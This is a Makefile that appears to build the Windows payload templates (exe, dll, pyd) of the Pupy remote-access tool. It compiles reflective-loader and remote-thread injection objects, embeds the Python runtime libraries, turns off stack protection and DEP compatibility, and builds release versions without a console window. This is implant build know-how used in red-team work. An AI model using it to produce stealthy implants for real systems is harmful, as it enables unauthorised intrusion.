BUILDENV ?= $(PWD)/buildenv

PYMAJ ?= 3
PYMIN ?= 10
SUFFIX ?= -$(PYMAJ)$(PYMIN).
BITS ?= 32


TEMPLATE_OUTPUT_PATH=../../pupy/payload_templates

ifndef ARCH
$(error You must specify an architecture - 64 or 32)
endif


CFLAGS := /D_WIN32

ifeq "$(ARCH)" "64"
CFLAGS := $(CFLAGS) /DWIN_X64 /D_WIN64 /nologo 
PPARCH := x64
BITS := 64
else
CFLAGS := $(CFLAGS) /DWIN_X86 /nologo
PPARCH := x86
BITS := 32
endif

OPENSSL_ABI ?= 1_1
LIBCRYPTO := libcrypto-$(OPENSSL_ABI).dll
LIBSSL := libssl-$(OPENSSL_ABI).dll
LIBFFI := libffi-7.dll

PYTHONPATH ?= C:\\Python$(PYMAJ)-$(BITS)

CC := $(BUILDENV)/$(BITS)/cl.sh
PYTHON := $(BUILDENV)/$(BITS)/python.sh
HOST_PYTHON := python3


CFLAGS += /Iresources\\$(ARCH) /Iresources 
CFLAGS += /DLIBCRYPTO=\"$(LIBCRYPTO)\" /DLIBSSL=\"$(LIBSSL)\" /DLIBFFI=\"$(LIBFFI)\"
CFLAGS += /EHa /GS- /GF-

ifdef DEBUG
DEBUG_ADD   := -debug
CFLAGS      := $(CFLAGS) /DDEBUG /DVERBOSE
#LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup
LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console
PPARCH      := $(PPARCH)d
CFLAGS_OPT  :=
else
DEBUG_ADD   :=
LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup /LTCG
# LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console /LTCG
PPARCH      := $(PPARCH)
CFLAGS      := $(CFLAGS) /DHAVE_WINDOW
CFLAGS_OPT  := /Os /GL /GS-
endif

SECARGS     := "cl" ".xzdata"

CFLAGS      := $(CFLAGS) /I..\\common

COMMON_OBJS := \
	actctx.obj \
	MyLoadLibrary.obj \
	MemoryModule.obj

LOADER_OBJS := \
	pupy_load.obj

PUPY_MODULE := \
	base_inject.obj \
	thread.obj remote_thread.obj \
	LoadLibraryR.obj \
	ReflectiveLoader.obj \
	pupy.obj

SHARED_OBJS := \
	main_reflective.obj

APP_OBJS := \
	main_exe.obj


ifneq ($(FEATURE_DYNLOAD),)
CFLAGS += /D_PUPY_DYNLOAD /D_PUPY_PRIVATE_NT
#CFLAGS += /D_PUPY_DYNLOAD
SHARED_OBJS += ReflectiveLoader.obj
LIBPYTHON_LIBS := $(PYTHONPATH)\\libs\\python$(PYMAJ)$(PYMIN).lib advapi32.lib
LIBPYTHON_INC := /I$(PYTHONPATH)\\include

else
SHARED_OBJS += $(PUPY_MODULE)
APP_OBJS += $(PUPY_MODULE)
endif

ifneq ($(FEATURE_POSTMORTEM),)
CFLAGS += /DPOSTMORTEM
endif

ifneq ($(DEBUG),)
PUPY_PYD := _pupy_debug.pyd
COMMON_OBJS += debug.obj
PUPY_MODULE += debug.obj
else
PUPY_PYD := _pupy.pyd
endif

PUPY_PYD_C := $(PUPY_PYD:%.pyd=%_pyd.c)
PUPY_PYD_LOADER := $(PUPY_PYD_C:%.c=%.loader)

ifeq ($(UNCOMPRESSED),)
COMMON_OBJS += LzmaDec.obj
COMPRESSED = 1
else
CFLAGS += /DUNCOMPRESSED
SUFFIX := unc-$(SUFFIX)
COMPRESSED = 0
endif

PUPY_LOAD_DEPS := \
	pupy_load.c \
	resources/$(ARCH)/library.c \
	resources/$(ARCH)/vcruntime140.c \
	resources/$(ARCH)/python3.c \
	resources/$(ARCH)/libssl.c \
	resources/$(ARCH)/libffi.c \
	resources/$(ARCH)/libcrypto.c \
	import-tab.c revision.h

TARGETS := \
	$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)exe \
	$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)dll

REQUIRED_LIBS := user32.lib

ifneq ($(FEATURE_DYNLOAD),)
	TARGETS += $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)pyd
	PUPY_LOAD_DEPS += resources/$(ARCH)/$(PUPY_PYD_C)
else
	REQUIRED_LIBS += advapi32.lib
endif

all: $(TARGETS)


pyd: $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)pyd

revision.h:
	if [ -z $$COMMIT ]; then rev=$$(cat ../../.git/`cat ../../.git/HEAD | cut -f 2 -d \ ` | cut -c 1-8); \
	 else rev=$$COMMIT; fi; echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@

import-tab.c import-tab.h: ../mktab.py
	$(HOST_PYTHON) $(PFLAGS) $< UCS4

resources/$(ARCH)/library.txt: ../gen_library_compressed_string.py resources/$(ARCH)/library.zip
	$(HOST_PYTHON) ../gen_library_compressed_string.py $@ resources/$(ARCH)/library.zip

resources/$(ARCH)/library.zip: ../build_library_zip.py
	$(PYTHON) ../build_library_zip.py $@

resources/$(ARCH)/library.c: ../gen_resource_header.py resources/$(ARCH)/library.txt resources/$(ARCH)/library.zip
	$(HOST_PYTHON) ../gen_resource_header.py resources/$(ARCH)/library.txt $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/$(LIBCRYPTO): $(BUILDENV)/win/drive_c/Python$(PYMAJ)-$(ARCH)/DLLs/$(LIBCRYPTO)
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/$(LIBSSL): $(BUILDENV)/win/drive_c/Python$(PYMAJ)-$(ARCH)/DLLs/$(LIBSSL)
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/$(LIBFFI): $(BUILDENV)/win/drive_c/Python$(PYMAJ)-$(ARCH)/DLLs/$(LIBFFI)
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/python$(PYMAJ)$(PYMIN).dll: $(BUILDENV)/win/drive_c/Python$(PYMAJ)-$(ARCH)/python$(PYMAJ)$(PYMIN).dll
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/vcruntime140.dll: $(BUILDENV)/win/drive_c/Python$(PYMAJ)-$(ARCH)/vcruntime140.dll
	@mkdir -p resources/$(ARCH)
	cp $< $@

resources/$(ARCH)/libcrypto.c: resources/$(ARCH)/$(LIBCRYPTO) ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/libssl.c: resources/$(ARCH)/$(LIBSSL) ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/libffi.c: resources/$(ARCH)/$(LIBFFI) ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/python3.c: resources/$(ARCH)/python$(PYMAJ)$(PYMIN).dll ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/vcruntime140.c: resources/$(ARCH)/vcruntime140.dll ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)

resources/$(ARCH)/$(PUPY_PYD_C): $(PUPY_PYD) ../gen_resource_header.py
	$(HOST_PYTHON) ../gen_resource_header.py $< resources/$(ARCH)/$(PUPY_PYD_C) $(COMPRESSED) $(SECARGS)

ReflectiveLoader.obj:	ReflectiveLoader.c
	#$(CC) /Fo$@ /c $(CFLAGS) /O2 /Ob1  $<
	$(CC) /Fo$@ /c $(CFLAGS) $<

ifeq ($(UNCOMPRESSED),)
LzmaDec.obj: ../common/LzmaDec.c
	$(CC) /c $(CFLAGS) $(CFLAGS_OPT) $< /Fo$@
endif

%.obj: %.c
	$(CC) /Fo$@ /c $(LIBPYTHON_INC) $(CFLAGS) $(CFLAGS_OPT) $<

%.obj: ../common/%.c
	$(CC) /Fo$@ /c $(LIBPYTHON_INC) $(CFLAGS) $(CFLAGS_OPT) $<


pupy_load.obj: $(PUPY_LOAD_DEPS)

$(PUPY_PYD): $(PUPY_MODULE) $(COMMON_OBJS) | revision.h
	$(CC) $(CFLAGS) $(CFLAGS_OPT) $^ /Fe$@ /LD $(LIBPYTHON_LIBS) /link /MAP:$(PUPY_PYD).map

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)exe: $(APP_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
	$(CC) $(CFLAGS) $(CFLAGS_OPT) $+ \
		/Fe$(TEMPLATE_OUTPUT_PATH)/exe_pupy$(PPARCH)$(SUFFIX)exe $(LINKER_OPTS) $(REQUIRED_LIBS)
	mv $(TEMPLATE_OUTPUT_PATH)/exe_pupy$(PPARCH)$(SUFFIX)exe $@
	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)dll: $(SHARED_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
	$(CC) $(CFLAGS) $(CFLAGS_OPT) $+ \
		/Fe$(TEMPLATE_OUTPUT_PATH)/dll_pupy$(PPARCH)$(SUFFIX)dll /LD $(REQUIRED_LIBS)
	mv $(TEMPLATE_OUTPUT_PATH)/dll_pupy$(PPARCH)$(SUFFIX)dll $@
	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)pyd: resources/$(ARCH)/$(PUPY_PYD_C) $(PUPY_PYD)
	cat resources/$(ARCH)/$(PUPY_PYD_LOADER) $(PUPY_PYD) > $@
	mv $(PUPY_PYD) $@

.PHONY: clean

clean:
	rm -f \
		$(COMMON_OBJS) \
		$(LOADER_OBJS) \
		$(PUPY_MODULE) \
		$(SHARED_OBJS) \
		$(PUPY_PYD_C) \
		$(APP_OBJS) \
		$(PUPY_PYD) \
		*.exp \
		*.lib \
		*.map \
		*.obj \
		$(TEMPLATE_OUTPUT_PATH)/*.lib \
		$(TEMPLATE_OUTPUT_PATH)/*.exp \
		$(TEMPLATE_OUTPUT_PATH)/*.map

distclean: clean
	rm -f revision.h
	rm -f import-tab.c
	rm -f import-tab.h
	rm -f revision.h
	rm -rf resources

$(COMMON_OBJS) $(PYOBJS): import-tab.h
